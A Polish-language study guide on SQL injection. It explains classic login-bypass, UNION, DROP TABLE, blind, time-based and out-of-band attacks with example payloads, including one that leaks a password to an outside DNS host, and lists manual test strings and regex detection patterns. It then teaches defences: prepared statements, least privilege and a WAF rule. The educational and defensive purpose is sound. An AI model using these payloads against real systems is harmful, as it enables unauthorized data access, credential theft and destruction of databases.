# SQL Injection - ataki i ochrona

## Definicja

**SQL Injection** to typ ataku na aplikacje webowe, w którym napastnik **wstrzykuje złośliwy kod SQL** do zapytania poprzez dane wejściowe użytkownika, co pozwala na **nieautoryzowany dostęp** do bazy danych.

### Mechanizm ataku:
1. **Aplikacja przyjmuje dane** od użytkownika
2. **Łączy je bezpośrednio** z zapytaniem SQL  
3. **Napastnik wprowadza kod SQL** zamiast normalnych danych
4. **Baza danych wykonuje** zarówno oryginalne jak i wstrzyknięte zapytanie

## Przykłady ataków SQL Injection

### Przykład 1: Klasyczny atak logowania
```sql
-- Kod aplikacji (PHP)
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

-- Normalny user wprowadza:
-- username: "john"
-- password: "secret123"
-- Wynikowe zapytanie:
SELECT * FROM users WHERE username = 'john' AND password = 'secret123';

-- Napastnik wprowadza:
-- username: "admin"
-- password: "' OR '1'='1"
-- Wynikowe zapytanie:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
-- Warunek '1'='1' jest zawsze prawdziwy → logowanie jako admin!
```

### Przykład 2: Atak UNION
```sql
-- Aplikacja szuka produktów
$search = $_GET['search'];
$query = "SELECT id, name, price FROM products WHERE name LIKE '%$search%'";

-- Napastnik wprowadza:
-- search: "laptop' UNION SELECT id, username, password FROM users --"
-- Wynikowe zapytanie:
SELECT id, name, price FROM products WHERE name LIKE '%laptop%' 
UNION SELECT id, username, password FROM users --;

-- Wynik: Lista produktów + lista użytkowników z hasłami!
```

### Przykład 3: Atak typu DROP TABLE
```sql
-- Pole wyszukiwania
$id = $_GET['id'];
$query = "SELECT * FROM articles WHERE id = $id";

-- Napastnik wprowadza:
-- id: "1; DROP TABLE articles; --"
-- Wynikowe zapytanie:
SELECT * FROM articles WHERE id = 1; DROP TABLE articles; --;

-- Skutek: Usunięcie całej tabeli articles!
```

### Przykład 4: Blind SQL Injection
```sql
-- Aplikacja nie pokazuje wyników, ale zachowuje się różnie
$user_id = $_GET['user_id'];
$query = "SELECT * FROM users WHERE id = $user_id AND active = 1";

-- Napastnik testuje:
-- user_id: "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'"

-- Jeśli strona zachowuje się normalnie → pierwsze hasło admin zaczyna się od 'a'
-- Jeśli strona wyświetla błąd → nie zaczyna się od 'a'
-- Powtarzając proces można odgadnąć całe hasło
```

## Rodzaje ataków SQL Injection

### 1. **In-band SQL Injection**
Napastnik otrzymuje wyniki bezpośrednio w odpowiedzi HTTP.

#### **Error-based**
- Wykorzystuje błędy bazy danych do ujawnienia informacji
```sql
-- Wprowadzenie błędnej składni ujawnia strukturę bazy
' AND (SELECT * FROM users WHERE username = 'admin') = 1 --
-- Error: subquery returns more than one column
```

#### **Union-based**
- Używa UNION do łączenia wyników z innymi tabelami
```sql
' UNION SELECT table_name, column_name, null FROM information_schema.columns --
```

### 2. **Blind SQL Injection**
Napastnik nie widzi wyników, ale może wnioskować z zachowania aplikacji.

#### **Boolean-based**
```sql
-- Test czy baza danych to MySQL
' AND (SELECT @@version) LIKE '%MySQL%' --

-- Jeśli strona działa normalnie → MySQL
-- Jeśli błąd → inna baza
```

#### **Time-based**
```sql
-- Test z opóźnieniem (MySQL)
' AND IF((SELECT COUNT(*) FROM users)>10, SLEEP(5), 0) --

-- Jeśli strona ładuje się 5 sekund → więcej niż 10 użytkowników
```

### 3. **Out-of-band SQL Injection**
Wykorzystuje alternatywne kanały komunikacji (DNS, HTTP).

```sql
-- Przykład z wykorzystaniem DNS (SQL Server)
'; EXEC xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.hacker.com\share'; --
```

## Metody ochrony

### 1. **Parametrized Queries / Prepared Statements** (NAJLEPSZE)

#### PHP PDO:
```php
// ❌ PODATNE
$query = "SELECT * FROM users WHERE username = '$username'";

// ✅ BEZPIECZNE  
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

#### Java JDBC:
```java
// ❌ PODATNE
String query = "SELECT * FROM users WHERE id = " + userId;

// ✅ BEZPIECZNE
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setInt(1, userId);
```

#### Python:
```python
# ❌ PODATNE
cursor.execute(f"SELECT * FROM users WHERE name = '{username}'")

# ✅ BEZPIECZNE
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))
```

#### C# .NET:
```csharp
// ❌ PODATNE
string query = $"SELECT * FROM users WHERE id = {userId}";

// ✅ BEZPIECZNE
string query = "SELECT * FROM users WHERE id = @userId";
SqlCommand cmd = new SqlCommand(query, connection);
cmd.Parameters.AddWithValue("@userId", userId);
```

### 2. **Input Validation and Sanitization**

#### Walidacja typów:
```php
// Sprawdź czy ID to liczba
if (!is_numeric($user_id)) {
    die("Invalid user ID");
}
$user_id = (int)$user_id;
```

#### Whitelist dozwolonych znaków:
```php
// Tylko litery, cyfry i podstawowe znaki
if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $username)) {
    die("Invalid username format");
}
```

#### Escape specjalnych znaków:
```php
// MySQL
$username = mysqli_real_escape_string($connection, $username);

// Ale to NIE JEST wystarczające jako jedyna ochrona!
```

### 3. **Stored Procedures**
```sql
-- Definicja procedury
CREATE PROCEDURE GetUser(IN user_id INT, IN user_pass VARCHAR(255))
BEGIN
    SELECT * FROM users 
    WHERE id = user_id AND password = user_pass;
END;

-- Wywołanie z aplikacji
CALL GetUser(123, 'haslo123');
```

### 4. **Least Privilege Principle**
```sql
-- Utwórz użytkownika tylko z potrzebnymi uprawnieniami
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- Daj tylko potrzebne uprawnienia
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT ON myapp.products TO 'webapp'@'localhost';

-- NIE DAWAJ:
-- GRANT ALL PRIVILEGES - zbyt szerokie
-- GRANT DROP, CREATE - niebezpieczne dla aplikacji web
-- GRANT FILE - może pozwolić na czytanie plików systemu
```

### 5. **Web Application Firewall (WAF)**
```nginx
# Nginx ModSecurity rules
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
```

### 6. **Error Handling**
```php
// ❌ ŹLE - ujawnia strukturę bazy
if (!$result) {
    die("Database error: " . mysqli_error($connection));
}

// ✅ DOBRZE - ogólny komunikat
if (!$result) {
    error_log("Database error: " . mysqli_error($connection));
    die("An error occurred. Please try again later.");
}
```

## Zaawansowane techniki ochrony

### 1. **Query Analysis**
```python
# Sprawdź czy zapytanie zawiera podejrzane wzorce
suspicious_patterns = [
    r'(\s|^)(union|select|insert|update|delete|drop|create|alter)\s',
    r'(\s|^)(or|and)\s+[\w\s]*=[\w\s]*',
    r'(\s|^)(sleep|benchmark|waitfor)\s*\(',
    r'--|\#|\/\*|\*\/'
]

def is_suspicious_query(query):
    for pattern in suspicious_patterns:
        if re.search(pattern, query.lower()):
            return True
    return False
```

### 2. **Database Activity Monitoring**
```sql
-- PostgreSQL - loguj wszystkie zapytania
log_statement = 'all'
log_min_duration_statement = 0

-- Monitoruj podejrzane wzorce w logach
grep -i "union\|drop\|information_schema" postgresql.log
```

### 3. **Content Security Policy**
```html
<!-- Ogranicz źródła skryptów -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'unsafe-inline'; object-src 'none';">
```

## Testowanie podatności

### Automatyczne narzędzia:
- **SQLMap** - automatyczne wykrywanie SQL injection
- **Burp Suite** - comprehensive web app testing
- **OWASP ZAP** - free security scanner
- **Havij** - automated SQL injection tool

### Manualne testowanie:
```sql
-- Test podstawowy
' OR '1'='1
" OR "1"="1
' OR 1=1 --
" OR 1=1 --

-- Test union
' UNION SELECT null, null, null --
' UNION SELECT 1,2,3 --

-- Test error-based
' AND (SELECT * FROM users) = 1 --
' GROUP BY 1,2,3,4,5 --

-- Test time-based
' AND (SELECT SLEEP(5)) --
' WAITFOR DELAY '00:00:05' --

-- Test boolean-based  
' AND 1=1 --
' AND 1=2 --
```

## Przykłady bezpiecznego kodu

### Kompletny przykład PHP:
```php
<?php
class UserService {
    private $pdo;
    
    public function __construct($pdo) {
        $this->pdo = $pdo;
    }
    
    public function authenticate($username, $password) {
        // 1. Walidacja wejścia
        if (!$this->isValidUsername($username)) {
            throw new InvalidArgumentException("Invalid username format");
        }
        
        if (strlen($password) < 8) {
            throw new InvalidArgumentException("Password too short");
        }
        
        try {
            // 2. Prepared statement
            $stmt = $this->pdo->prepare(
                "SELECT id, username, password_hash, failed_attempts, locked_until 
                 FROM users 
                 WHERE username = ? AND active = 1"
            );
            
            $stmt->execute([$username]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if (!$user) {
                $this->logFailedAttempt($username, "User not found");
                return false;
            }
            
            // 3. Rate limiting
            if ($user['failed_attempts'] >= 5 && 
                strtotime($user['locked_until']) > time()) {
                throw new Exception("Account locked due to too many failed attempts");
            }
            
            // 4. Weryfikacja hasła (hashed)
            if (password_verify($password, $user['password_hash'])) {
                $this->resetFailedAttempts($user['id']);
                return $user;
            } else {
                $this->incrementFailedAttempts($user['id']);
                return false;
            }
            
        } catch (PDOException $e) {
            // 5. Bezpieczne logowanie błędów
            error_log("Database error in authentication: " . $e->getMessage());
            throw new Exception("Authentication service temporarily unavailable");
        }
    }
    
    private function isValidUsername($username) {
        return preg_match('/^[a-zA-Z0-9_.-]{3,50}$/', $username);
    }
    
    private function logFailedAttempt($username, $reason) {
        error_log("Failed login attempt for username: $username, reason: $reason");
    }
}
?>
```

## Compliance i standardy

### OWASP Top 10:
- **A03:2021 - Injection** (wcześniej #1)
- Wciąż jedna z najważniejszych podatności

### Standardy bezpieczeństwa:
- **PCI DSS** - wymagania dla aplikacji płatniczych
- **ISO 27001** - standardy bezpieczeństwa informacji
- **NIST Cybersecurity Framework**

## Pułapki egzaminacyjne

### 1. **Mityczne "bezpieczne" metody**
- **Escape functions** - mogą być omijane
- **Blacklisting** - niepełne listy słów zabronionych
- **String replacement** - może być obchodzone

### 2. **Prepared Statements**
- **Nie chronią** przed wszystkimi rodzajami injection
- **Nie chronią** jeśli parametry są źle używane
- **Najlepsza ochrona** dla większości przypadków

### 3. **Rodzaje ataków**
- **In-band** - bezpośrednie wyniki
- **Blind** - wnioskowanie z zachowania
- **Out-of-band** - alternatywne kanały

### 4. **Zasada najmniejszych uprawnień**
- **Database user** powinien mieć minimalne uprawnienia
- **Nie dawać** uprawnień DDL dla aplikacji web
- **Monitorować** aktywność bazy danych